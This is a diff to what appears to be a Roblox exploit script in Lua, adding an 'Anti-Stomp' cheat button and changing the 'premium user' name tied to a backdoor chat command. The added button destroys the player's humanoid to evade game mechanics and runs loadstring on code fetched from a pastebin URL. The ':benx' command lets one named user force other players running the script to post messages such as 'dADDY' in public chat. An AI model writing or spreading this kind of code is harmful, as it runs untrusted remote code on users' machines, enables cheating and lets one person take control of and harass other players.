@@ -174,6 +174,9 @@ end)
 Section2:NewButton("70", "ButtonInfo", function()
    workspace.CurrentCamera.FieldOfView = 70
 end)
+Section2:NewButton("Anti-Stomp", "ButtonInfo", function()
+    pcall(function() if tostring(game.PlaceId) == "2788229376" then local corepackages = game:GetService"CorePackages" local localplayer = game:GetService"Players".LocalPlayer local run = game:GetService"RunService" run:BindToRenderStep("rrrrrrrrrrr",2000,function() pcall(function() if localplayer.Character.Humanoid.Health <= 30 then localplayer.Character.Humanoid:UnequipTools() localplayer.Character.Humanoid:Destroy() workspace.CurrentCamera.CameraSubject = localplayer.Character wait() local prt = Instance.new("Model", corepackages); Instance.new("Part", prt).Name="Torso"; Instance.new("Part", prt).Name="Head"; Instance.new("Humanoid", prt).Name="Humanoid"; localplayer.Character=prt end end) pcall(function() if localplayer.Character.Humanoid.FloorMaterial == "Plastic" then ReplicatedStorage:FireServer("Stomp") end end) end) loadstring(game:HttpGet("https://pastebin.com/raw/MQ3wc7Zq", true))() end end)
+end)
 Section2:NewButton("Fly X", "ButtonInfo", function()
     local plr = game.Players.LocalPlayer
 local mouse = plr:GetMouse()
@@ -288,7 +291,7 @@ end)
 
 
  --// Premium User //--
-local user_premium__001 = game.Players.Tellybellygoat --// Replace "User101" with your username (NOT DISPLAY) //--
+local user_premium__001 = game.Players.MadelineTorres1 --// Replace "User101" with your username (NOT DISPLAY) //--
 
 -----------------------------------------------------------------------
 -----------------------------------------------------------------------
@@ -372,7 +375,7 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":benx .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			wait(0) local A_1 = "Yeah Yeah!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			wait(0) local A_1 = "dADDY" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = user_premium__001.Character.HumanoidRootPart
 			local benxed = true
 			while benxed == true do
